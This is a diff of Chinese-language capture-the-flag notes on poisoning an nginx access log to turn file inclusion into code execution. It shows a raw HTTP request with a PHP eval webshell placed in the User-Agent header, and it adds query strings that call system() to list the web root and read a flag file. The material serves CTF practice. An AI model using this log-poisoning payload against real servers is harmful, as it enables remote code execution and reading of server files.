@@ -88,7 +88,7 @@
 ````
 GET /?file=/var/log/nginx/access.log HTTP/1.1
 Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
-User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>       \\在这里改噢
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
 Accept-Encoding: gzip, deflate
@@ -97,8 +97,20 @@ Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec
 Connection: close
 ````
 
+<br>
+
+* 条件竞争漏洞：（相关：2023年线上赛web）
+[条件竞争](https://www.freebuf.com/articles/web/275557.html)
 
 <br>
+
+* 可以直接命令执行即可也可以用webshell后门工具连接
+
+* ?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();
+
+* ?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();
+
+
 
 ````
 一般使用方法：
